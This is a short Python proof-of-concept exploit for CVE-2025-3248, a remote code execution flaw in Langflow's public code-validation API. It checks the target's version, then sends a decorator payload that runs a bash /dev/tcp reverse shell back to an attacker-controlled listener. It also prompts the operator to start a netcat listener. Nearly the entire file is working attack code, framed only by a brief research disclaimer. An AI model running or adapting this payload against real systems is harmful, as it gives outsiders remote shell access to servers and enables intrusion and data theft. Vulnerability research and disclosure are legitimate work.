# Code author: github.com/bxsic-fr
# Morpheus research project
# CVE-2025-3248 : RCE through publicly exposed API.
# https://www.cve.org/CVERecord?id=CVE-2025-3248
# Reference: https://github.com/langflow-ai/langflow/pull/6911/files

import requests, json, os
from packaging.version import Version
import socket, sys, time

print("CVE-2025-3248 POC")
print("Disclamer: This code is not the original Proof-Of-Concept and only exists to provide a different point-of-view. The main purpose of this research is to understand users data process into the application and the different ways to exploit it - and to learn about it -")

victim_url = "http://192.168.1.7:7860"
listener_ip = "192.168.1.29"
listener_port = 8000

code = f'''
def pwn(func):
    __import__("subprocess").call(["bash", "-c", "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"])

@pwn
def main():
    return 0
'''

payload = {'code': code}

def getversion():
    res = requests.get(victim_url + '/api/v1/version').json()
    res_version = Version(res['version'])
    print(f"Version {res_version} found")
    if res_version > Version('1.3.0'):
        print(f"Version {res_version} not vulnerable, exiting...")
        return False
    return True

def main():    
    if not getversion():
        exit()
    input("Create listener with 'nc -lnvp 8000'")
    print("Sending payload... If it's stucks, u succeed.")
    response_exploit = requests.post(victim_url + '/api/v1/validate/code', headers={"Content-Type": "application/json"}, json=payload)
    return 0
    # print(response_exploit.text)

if __name__ == "__main__":
    main()
